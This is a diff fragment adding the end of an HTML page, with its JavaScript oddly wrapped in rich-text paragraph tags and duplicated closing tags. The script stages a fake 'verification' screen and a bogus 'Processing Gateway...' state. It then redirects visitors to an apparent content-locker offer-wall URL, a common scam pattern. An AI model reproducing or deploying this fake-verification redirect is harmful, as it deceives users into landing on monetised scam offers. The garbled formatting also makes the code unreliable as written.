+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><span class="Apple-converted-space">        </span></p>
+<p class="p1"><span class="Apple-converted-space">        </span>function closeConfirmation() {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('confirmationModal').classList.add('hidden');</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.body.style.overflow = 'auto';</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><span class="Apple-converted-space">        </span></p>
+<p class="p1"><span class="Apple-converted-space">        </span>function goToVerification() {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('confirmationModal').classList.add('hidden');</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('verificationScreen').classList.remove('hidden');</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><span class="Apple-converted-space">        </span></p>
+<p class="p1"><span class="Apple-converted-space">        </span>function triggerOfferWall() {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>const btn = document.getElementById('verifyBtn');</p>
+<p class="p1"><span class="Apple-converted-space">            </span>btn.innerHTML = "Processing Gateway...";</p>
+<p class="p1"><span class="Apple-converted-space">            </span>btn.disabled = true;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('loadingStatus').classList.remove('hidden');</p>
+<p class="p2"><span class="Apple-converted-space">            </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>setTimeout(() =&gt; {</p>
+<p class="p1"><span class="Apple-converted-space">                </span>window.location.href = "https://lockedpage1.website/cl/i/qkv7w4";</p>
+<p class="p1"><span class="Apple-converted-space">            </span>}, 800);</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/script&gt;</p>
+<p class="p1">&lt;/body&gt;</p>
+<p class="p1">&lt;/html&gt;</p>
+</body>
+</html>
